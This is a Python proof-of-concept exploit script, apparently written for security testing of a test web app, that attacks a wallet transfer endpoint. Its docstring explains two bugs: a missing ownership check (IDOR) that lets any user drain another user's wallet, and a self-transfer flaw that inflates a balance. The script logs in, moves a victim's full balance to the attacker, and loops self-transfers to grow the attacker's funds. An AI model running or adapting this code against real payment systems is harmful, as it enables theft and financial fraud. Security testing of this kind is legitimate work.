#!/usr/bin/env python3
"""
BAC-6 — Wallet Transfer: IDOR + Self-Transfer Balance Inflation
Endpoint: POST /api/wallet/transfer
Auth    : Any authenticated user

Two independent bugs in the transfer endpoint:

  Bug 1 — IDOR (Missing Ownership Check):
    The endpoint accepts `from_wallet_id` as user input and looks it up
    directly: `Wallet.filter(Wallet.id == body.from_wallet_id)`.
    There is no check that `from_wallet.user_id == current_user.id`.
    Any authenticated user can drain any other user's wallet by supplying
    a victim's wallet ID as `from_wallet_id`.

  Bug 2 — Self-Transfer Balance Inflation:
    The endpoint reads both balances before modifying either:

        from_balance = from_wallet.balance   # 100
        to_balance   = to_wallet.balance     # 100  ← same object, same value

        from_wallet.balance = round(from_balance - amount, 2)  # → 0
        to_wallet.balance   = round(to_balance   + amount, 2)  # → 200 !

    When from_wallet_id == to_wallet_id, SQLAlchemy's identity map returns
    the SAME Python object for both queries. `to_balance` was captured before
    the deduction, so it still holds the original value. The credit
    overwrites the deduction, resulting in `balance + amount` instead of
    no change. Transfer $100 to yourself → balance goes from $100 to $200.

Demo flow
---------
  Exploit 1 (IDOR):
    1. Attacker (charlie) authenticates
    2. Learns victim's wallet ID (e.g. from /api/wallet as alice)
    3. Transfers $X FROM alice's wallet TO own wallet

  Exploit 2 (Self-transfer inflation):
    1. Attacker authenticates, learns own wallet ID
    2. POST /transfer with from_wallet_id == to_wallet_id
    3. Each call doubles the transferred amount; repeat to reach any balance

Usage
-----
    python poc_018_wallet_transfer_idor_selftransfer.py
    python poc_018_wallet_transfer_idor_selftransfer.py --url http://localhost:8000
    python poc_018_wallet_transfer_idor_selftransfer.py --exploit idor
    python poc_018_wallet_transfer_idor_selftransfer.py --exploit self
"""

import argparse
import sys
import requests

ATTACKER_EMAIL    = "charlie@mercury.com"
ATTACKER_PASSWORD = "Buyer123!"
VICTIM_EMAIL      = "diana@mercury.com"
VICTIM_PASSWORD   = "Buyer123!"


def banner():
    print("=" * 60)
    print("  BAC-6 — Wallet Transfer IDOR + Self-Transfer Inflation")
    print("  Endpoint: POST /api/wallet/transfer")
    print("=" * 60)


def login(base_url, email, password):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print(f"[-] Login failed for {email}"); sys.exit(1)
    return token


def get_wallet(base_url, token):
    resp = requests.get(f"{base_url}/api/wallet",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    resp.raise_for_status()
    return resp.json()


def transfer(base_url, token, from_wallet_id, to_wallet_id, amount, note=""):
    resp = requests.post(
        f"{base_url}/api/wallet/transfer",
        headers={"Authorization": f"Bearer {token}"},
        json={"from_wallet_id": from_wallet_id, "to_wallet_id": to_wallet_id,
              "amount": amount, "note": note},
        timeout=10,
    )
    return resp


def exploit_idor(base_url):
    print("\n[*] Exploit 1 — IDOR: drain victim wallet into attacker wallet")

    atk_token  = login(base_url, ATTACKER_EMAIL, ATTACKER_PASSWORD)
    vic_token  = login(base_url, VICTIM_EMAIL,   VICTIM_PASSWORD)

    atk_wallet = get_wallet(base_url, atk_token)
    vic_wallet = get_wallet(base_url, vic_token)

    print(f"    Attacker wallet id={atk_wallet['id']}  balance=${atk_wallet['balance']:.2f}")
    print(f"    Victim   wallet id={vic_wallet['id']}  balance=${vic_wallet['balance']:.2f}")

    steal_amount = vic_wallet["balance"]
    if steal_amount <= 0:
        print("    [!] Victim has no funds to steal — depositing $50 to victim first")
        requests.post(f"{base_url}/api/wallet/deposit",
                      headers={"Authorization": f"Bearer {vic_token}"},
                      json={"amount": 50.0, "payment_method": "card"}, timeout=10)
        vic_wallet = get_wallet(base_url, vic_token)
        steal_amount = vic_wallet["balance"]

    print(f"\n    Transferring ${steal_amount:.2f} FROM victim (id={vic_wallet['id']}) "
          f"TO attacker (id={atk_wallet['id']}) using attacker's token...")

    resp = transfer(base_url, atk_token,
                    from_wallet_id=vic_wallet["id"],
                    to_wallet_id=atk_wallet["id"],
                    amount=steal_amount,
                    note="IDOR transfer")

    if resp.status_code == 200:
        new_atk = get_wallet(base_url, atk_token)
        new_vic = get_wallet(base_url, vic_token)
        print(f"    [+] Transfer succeeded!")
        print(f"    Attacker new balance: ${new_atk['balance']:.2f}")
        print(f"    Victim   new balance: ${new_vic['balance']:.2f}")
    else:
        print(f"    [-] Transfer failed: {resp.status_code} {resp.text[:200]}")


def exploit_self_transfer(base_url):
    print("\n[*] Exploit 2 — Self-Transfer: inflate own balance")

    atk_token  = login(base_url, ATTACKER_EMAIL, ATTACKER_PASSWORD)
    atk_wallet = get_wallet(base_url, atk_token)
    wid        = atk_wallet["id"]

    print(f"    Attacker wallet id={wid}  starting balance=${atk_wallet['balance']:.2f}")

    if atk_wallet["balance"] < 10:
        print("    Depositing $100 first (need some funds to transfer)...")
        requests.post(f"{base_url}/api/wallet/deposit",
                      headers={"Authorization": f"Bearer {atk_token}"},
                      json={"amount": 100.0, "payment_method": "card"}, timeout=10)
        atk_wallet = get_wallet(base_url, atk_token)
        print(f"    Balance after deposit: ${atk_wallet['balance']:.2f}")

    amount = min(round(atk_wallet["balance"], 2), 9999.0)

    for i in range(1, 4):
        resp = transfer(base_url, atk_token,
                        from_wallet_id=wid,
                        to_wallet_id=wid,
                        amount=amount,
                        note=f"self-transfer round {i}")
        if resp.status_code == 200:
            w = get_wallet(base_url, atk_token)
            print(f"    Round {i}: transferred ${amount:.2f} to self → balance=${w['balance']:.2f}")
            amount = min(round(w["balance"], 2), 9999.0)
        else:
            print(f"    Round {i}: failed — {resp.status_code} {resp.text[:200]}")
            break


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--exploit", choices=["idor", "self", "both"], default="both")
    args = parser.parse_args()

    banner()
    print(f"[*] Target: {args.url}")

    if args.exploit in ("idor", "both"):
        exploit_idor(args.url)
    if args.exploit in ("self", "both"):
        exploit_self_transfer(args.url)

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
